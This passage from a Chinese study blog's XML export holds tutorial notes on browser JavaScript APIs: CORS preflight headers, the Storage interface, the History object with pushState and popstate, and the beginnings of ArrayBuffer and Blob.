<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="built_in">Date</span>: Mon, <span class="number">01</span> Dec <span class="number">2008</span> <span class="number">01</span>:<span class="number">15</span>:<span class="number">39</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.0</span><span class="number">.61</span> (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Keep-Alive: timeout=<span class="number">2</span>, max=<span class="number">100</span></span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>
<p>上面的 HTTP 回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
<p>如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">OPTIONS http:<span class="comment">//api.bob.com HTTP/1.1</span></span><br><span class="line">Status: <span class="number">200</span></span><br><span class="line">Access-Control-Allow-Origin: https:<span class="comment">//notyourdomain.com</span></span><br><span class="line">Access-Control-Allow-Method: POST</span><br></pre></td></tr></table></figure>
<p>上面的服务器回应，<code>Access-Control-Allow-Origin</code>字段明确不包括发出请求的<code>http://api.bob.com</code>。</p>
<p>这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http:<span class="comment">//api.alice.com.</span></span><br><span class="line">Origin http:<span class="comment">//api.bob.com is not allowed by Access-Control-Allow-Origin.</span></span><br></pre></td></tr></table></figure>
<p>服务器回应的其他 CORS 相关字段如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Access-Control-Max-Age: <span class="number">1728000</span></span><br></pre></td></tr></table></figure>
<h6 id="（1）Access-Control-Allow-Methods"><a href="#（1）Access-Control-Allow-Methods" class="headerlink" title="（1）Access-Control-Allow-Methods"></a>（1）Access-Control-Allow-Methods</h6><p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。</p>
<h6 id="（2）Access-Control-Allow-Headers"><a href="#（2）Access-Control-Allow-Headers" class="headerlink" title="（2）Access-Control-Allow-Headers"></a>（2）Access-Control-Allow-Headers</h6><p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。</p>
<h6 id="（3）Access-Control-Allow-Credentials"><a href="#（3）Access-Control-Allow-Credentials" class="headerlink" title="（3）Access-Control-Allow-Credentials"></a>（3）Access-Control-Allow-Credentials</h6><p>该字段与简单请求时的含义相同。</p>
<h6 id="（4）Access-Control-Max-Age"><a href="#（4）Access-Control-Max-Age" class="headerlink" title="（4）Access-Control-Max-Age"></a>（4）Access-Control-Max-Age</h6><p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h5 id="7-4-3-浏览器的正常请求和回应"><a href="#7-4-3-浏览器的正常请求和回应" class="headerlink" title="7.4.3 浏览器的正常请求和回应"></a>7.4.3 浏览器的正常请求和回应</h5><p>一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
<p>下面是“预检”请求之后，浏览器的正常 CORS 请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">PUT /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Host: api.alice.com</span><br><span class="line">X-Custom-Header: value</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>
<h4 id="7-5-与-JSONP-的比较"><a href="#7-5-与-JSONP-的比较" class="headerlink" title="7.5 与 JSONP 的比较"></a>7.5 与 JSONP 的比较</h4><p>CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持<code>GET</code>请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-CORS 通信</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0062</title>
    <url>/2021/06/02/%E6%89%93%E5%8D%A10062/</url>
    <content><![CDATA[<p><font color=#525f42>无论到了什么年龄，眼里都要有清澈的光芒，看过黑白之后，心中还有彩色留存。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="8-Storage-接口"><a href="#8-Storage-接口" class="headerlink" title="8.Storage 接口"></a>8.Storage 接口</h3><h4 id="8-1-概述"><a href="#8-1-概述" class="headerlink" title="8.1 概述"></a>8.1 概述</h4><p>Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口：<code>window.sessionStorage</code>和<code>window.localStorage</code>。</p>
<p><code>sessionStorage</code>保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空；<code>localStorage</code>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。</p>
<p>保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。</p>
<p>这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中，<code>a.example.com</code>和<code>b.example.com</code>共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。</p>
<span id="more"></span>
<h4 id="8-2-属性和方法"><a href="#8-2-属性和方法" class="headerlink" title="8.2 属性和方法"></a>8.2 属性和方法</h4><p>Storage 接口只有一个属性。</p>
<ul>
<li><code>Storage.length</code>：返回保存的数据项个数。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.localStorage.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>该接口提供5个方法。</p>
<h5 id="8-2-1-Storage-setItem"><a href="#8-2-1-Storage-setItem" class="headerlink" title="8.2.1 Storage.setItem()"></a>8.2.1 Storage.setItem()</h5><p><code>Storage.setItem()</code>方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.sessionStorage.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，<code>Storage.setItem()</code>两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.sessionStorage.setItem(<span class="number">3</span>, &#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"><span class="built_in">window</span>.sessionStorage.getItem(<span class="string">&#x27;3&#x27;</span>) <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setItem</code>方法的两个参数都不是字符串，但是存入的值都是字符串。</p>
<p>如果储存空间已满，该方法会抛错。</p>
<p>写入不一定要用这个方法，直接赋值也是可以的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面三种写法等价</span></span><br><span class="line"><span class="built_in">window</span>.localStorage.foo = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.localStorage[<span class="string">&#x27;foo&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.localStorage.setItem(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="8-2-2-Storage-getItem"><a href="#8-2-2-Storage-getItem" class="headerlink" title="8.2.2 Storage.getItem()"></a>8.2.2 Storage.getItem()</h5><p><code>Storage.getItem()</code>方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sessionStorage.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="8-2-3-Storage-removeItem"><a href="#8-2-3-Storage-removeItem" class="headerlink" title="8.2.3 Storage.removeItem()"></a>8.2.3 Storage.removeItem()</h5><p><code>Storage.removeItem()</code>方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sessionStorage.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="8-2-4-Storage-clear"><a href="#8-2-4-Storage-clear" class="headerlink" title="8.2.4 Storage.clear()"></a>8.2.4 Storage.clear()</h5><p><code>Storage.clear()</code>方法用于清除所有保存的数据。该方法的返回值是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.sessionStorage.clear()</span><br><span class="line"><span class="built_in">window</span>.localStorage.clear()</span><br></pre></td></tr></table></figure>
<h5 id="8-2-5-Storage-key"><a href="#8-2-5-Storage-key" class="headerlink" title="8.2.5 Storage.key()"></a>8.2.5 Storage.key()</h5><p><code>Storage.key()</code>方法接受一个整数作为参数（从零开始），返回该位置对应的键名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.sessionStorage.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="built_in">window</span>.sessionStorage.key(<span class="number">0</span>) <span class="comment">// &quot;key&quot;</span></span><br></pre></td></tr></table></figure>
<p>结合使用<code>Storage.length</code>属性和<code>Storage.key()</code>方法，可以遍历所有的键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">window</span>.localStorage.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">localStorage</span>.key(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="8-3-storage-事件"><a href="#8-3-storage-事件" class="headerlink" title="8.3 storage 事件"></a>8.3 storage 事件</h4><p>Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;storage&#x27;</span>, onStorageChange);</span><br></pre></td></tr></table></figure>
<p>监听函数接受一个<code>event</code>实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。</p>
<ul>
<li><code>StorageEvent.key</code>：字符串，表示发生变动的键名。如果 storage 事件是由<code>clear()</code>方法引起，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.newValue</code>：字符串，表示新的键值。如果 storage 事件是由<code>clear()</code>方法或删除该键值对引发的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.oldValue</code>：字符串，表示旧的键值。如果该键值对是新增的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.storageArea</code>：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。</li>
<li><code>StorageEvent.url</code>：字符串，表示原始触发 storage 事件的那个网页的网址。</li>
</ul>
<p>下面是<code>StorageEvent.key</code>属性的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onStorageChange</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;storage&#x27;</span>, onStorageChange);</span><br></pre></td></tr></table></figure>
<p>注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-Storage 接口</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0063</title>
    <url>/2021/06/02/%E6%89%93%E5%8D%A10063/</url>
    <content><![CDATA[<p><font color=#2585a6>独行的人总会遇到有趣的人</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="9-History-对象"><a href="#9-History-对象" class="headerlink" title="9.History 对象"></a>9.History 对象</h3><h4 id="9-1-概述"><a href="#9-1-概述" class="headerlink" title="9.1 概述"></a>9.1 概述</h4><p><code>window.history</code>属性指向 History 对象，它表示当前窗口的浏览历史。</p>
<p>History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.history.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 后退到前一个网址</span></span><br><span class="line">history.back()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">history.go(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。</p>
<span id="more"></span>
<h4 id="9-2-属性"><a href="#9-2-属性" class="headerlink" title="9.2 属性"></a>9.2 属性</h4><p>History 对象主要有两个属性。</p>
<ul>
<li><code>History.length</code>：当前窗口访问过的网址数量（包括当前网页）</li>
<li><code>History.state</code>：History 堆栈最上层的状态值（详见下文）</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前窗口访问过多少个网页</span></span><br><span class="line"><span class="built_in">window</span>.history.length <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// History 对象的当前状态</span></span><br><span class="line"><span class="comment">// 通常是 undefined，即未设置</span></span><br><span class="line"><span class="built_in">window</span>.history.state <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<h4 id="9-3-方法"><a href="#9-3-方法" class="headerlink" title="9.3 方法"></a>9.3 方法</h4><h5 id="9-3-1-History-back-、History-forward-、History-go"><a href="#9-3-1-History-back-、History-forward-、History-go" class="headerlink" title="9.3.1 History.back()、History.forward()、History.go()"></a>9.3.1 History.back()、History.forward()、History.go()</h5><p>这三个方法用于在历史之中移动。</p>
<ul>
<li><code>History.back()</code>：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。</li>
<li><code>History.forward()</code>：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。</li>
<li><code>History.go()</code>：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如go(1)相当于<code>forward()</code>，<code>go(-1)</code>相当于<code>back()</code>。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为<code>0</code>，相当于刷新当前页面。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.back();</span><br><span class="line">history.forward();</span><br><span class="line">history.go(-<span class="number">2</span>);</span><br><span class="line">history.go(<span class="number">0</span>); <span class="comment">// 刷新当前页面</span></span><br></pre></td></tr></table></figure>
<p>注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</p>
<h5 id="9-3-2-History-pushState-，"><a href="#9-3-2-History-pushState-，" class="headerlink" title="9.3.2 History.pushState()，"></a>9.3.2 History.pushState()，</h5><p><code>History.pushState()</code>方法用于在历史中添加一条记录。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.history.pushState(state, title, url)</span><br></pre></td></tr></table></figure>
<p>该方法接受三个参数，依次为：</p>
<ul>
<li><code>state</code>：一个与添加的记录相关联的状态对象，主要用于<code>popstate</code>事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填<code>null</code>。</li>
<li><code>title</code>：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。</li>
<li><code>url</code>：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。</li>
</ul>
<p>假定当前网址是<code>example.com/1.html</code>，使用<code>pushState()</code>方法在浏览记录（History 对象）中添加一个新记录。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stateObj = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line">history.pushState(stateObj, <span class="string">&#x27;page 2&#x27;</span>, <span class="string">&#x27;2.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>添加新记录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但并不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问<code>google.com</code>)，然后点击了倒退按钮，页面的 URL 将显示<code>2.html</code>；你再点击一次倒退按钮，URL 将显示<code>1.html</code>。</p>
<p>总之，<code>pushState()</code>方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。</p>
<p>使用该方法之后，就可以用<code>History.state</code>属性读出状态对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stateObj = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line">history.pushState(stateObj, <span class="string">&#x27;page 2&#x27;</span>, <span class="string">&#x27;2.html&#x27;</span>);</span><br><span class="line">history.state <span class="comment">// &#123;foo: &quot;bar&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>pushState</code>的 URL 参数设置了一个新的锚点值（即<code>hash</code>），并不会触发<code>hashchange</code>事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。</p>
<p>如果<code>pushState()</code>方法设置了一个跨域网址，则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="comment">// 当前网址为 http://example.com</span></span><br><span class="line">history.pushState(<span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;https://twitter.com/hello&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>pushState</code>想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。</p>
<h5 id="9-3-3-History-replaceState"><a href="#9-3-3-History-replaceState" class="headerlink" title="9.3.3 History.replaceState()"></a>9.3.3 History.replaceState()</h5><p><code>History.replaceState()</code>方法用来修改 History 对象的当前记录，其他都与<code>pushState()</code>方法一模一样。</p>
<p>假定当前网页是<code>example.com/example.html</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.pushState(&#123;<span class="attr">page</span>: <span class="number">1</span>&#125;, <span class="string">&#x27;title 1&#x27;</span>, <span class="string">&#x27;?page=1&#x27;</span>)</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=1</span></span><br><span class="line"></span><br><span class="line">history.pushState(&#123;<span class="attr">page</span>: <span class="number">2</span>&#125;, <span class="string">&#x27;title 2&#x27;</span>, <span class="string">&#x27;?page=2&#x27;</span>);</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=2</span></span><br><span class="line"></span><br><span class="line">history.replaceState(&#123;<span class="attr">page</span>: <span class="number">3</span>&#125;, <span class="string">&#x27;title 3&#x27;</span>, <span class="string">&#x27;?page=3&#x27;</span>);</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=3</span></span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=1</span></span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html</span></span><br><span class="line"></span><br><span class="line">history.go(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=3</span></span><br></pre></td></tr></table></figure>
<h4 id="9-4-popstate-事件"><a href="#9-4-popstate-事件" class="headerlink" title="9.4 popstate 事件"></a>9.4 popstate 事件</h4><p>每当同一个文档的浏览历史（即<code>history</code>对象）出现变化时，就会触发<code>popstate</code>事件。</p>
<p>注意，仅仅调用<code>pushState()</code>方法或<code>replaceState()</code>方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用<code>History.back()</code>、<code>History.forward()</code>、<code>History.go()</code>方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。</p>
<p>使用的时候，可以为<code>popstate</code>事件指定回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onpopstate = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;location: &#x27;</span> + <span class="built_in">document</span>.location);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;state: &#x27;</span> + <span class="built_in">JSON</span>.stringify(event.state));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;popstate&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;location: &#x27;</span> + <span class="built_in">document</span>.location);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;state: &#x27;</span> + <span class="built_in">JSON</span>.stringify(event.state));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>回调函数的参数是一个<code>event</code>事件对象，它的<code>state</code>属性指向<code>pushState</code>和<code>replaceState</code>方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的<code>event.state</code>，就是通过<code>pushState</code>和<code>replaceState</code>方法，为当前 URL 绑定的<code>state</code>对象。</p>
<p>这个<code>state</code>对象也可以直接通过<code>history</code>对象读取。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> currentState = history.state;</span><br></pre></td></tr></table></figure>
<p>注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-History 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0065</title>
    <url>/2021/06/03/%E6%89%93%E5%8D%A10065/</url>
    <content><![CDATA[<p><font color=#afdfe4>有人弃棋，有人做泥荷做清溪，有人成为风雨里的一行诗句。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="11-ArrayBuffer-对象，Blob-对象"><a href="#11-ArrayBuffer-对象，Blob-对象" class="headerlink" title="11. ArrayBuffer 对象，Blob 对象"></a>11. ArrayBuffer 对象，Blob 对象</h3><h4 id="11-1-ArrayBuffer-对象"><a href="#11-1-ArrayBuffer-对象" class="headerlink" title="11.1 ArrayBuffer 对象"></a>11.1 ArrayBuffer 对象</h4><p>ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。这个对象可以看作内存数据的表达。</p>
<p>这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。</p>
<p>浏览器原生提供<code>ArrayBuffer()</code> 构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，实例对象<code>buffer</code>占用8个字节。</p>
<p>ArrayBuffer 对象有实例属性<code>byteLength</code>，表示当前实例占用的内存长度（单位字节）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">buffer.byteLength <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<p>ArrayBuffer 对象有实例方法<code>slice()</code>，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> buf2 = buf1.slice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码表示复制原来的实例。</p>
<span id="more"></span>
<h4 id="11-2-Blob-对象"><a href="#11-2-Blob-对象" class="headerlink" title="11.2 Blob 对象"></a>11.2 Blob 对象</h4><h5 id="11-2-1-简介"><a href="#11-2-1-简介" class="headerlink" title="11.2.1 简介"></a>11.2.1 简介</h5><p>Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object （二进制大型对象）的缩写。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。</p>
<p>浏览器原生提供<code>Blob()</code>构造函数，用来生成实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Blob(array [, options])</span><br></pre></td></tr></table></figure>
<p><code>Blob</code>构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的<code>Blob</code>实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性<code>type</code>，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。</p>
